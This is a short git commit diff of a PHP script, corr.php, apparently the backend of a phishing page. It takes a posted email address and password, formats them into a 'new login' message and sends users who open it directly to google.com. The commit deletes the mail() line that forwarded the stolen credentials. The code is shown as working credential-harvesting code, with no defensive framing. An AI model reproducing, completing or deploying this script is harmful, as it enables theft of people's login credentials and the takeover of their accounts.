0423a6a50417387bb78d27d2073877b762897fab
ast40 <157293608+ast40@users.noreply.github.com>
2024-01-21 15:52:35 +0100

    corr.php

--- corr.php
+++ corr.php
@@ -14,8 +14,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $subject = "Nuevo inicio de sesión";
     $message = "Correo electrónico: $correo\nContraseña: $contrasena";
 
-    // Esta función de mail es solo un ejemplo y podría no funcionar en todos los servidores
-    mail($to, $subject, $message);
 } else {
     // Si alguien intenta acceder directamente a este script, redirigirlos a la página de inicio de sesión
     header("Location: https://www.google.com/");
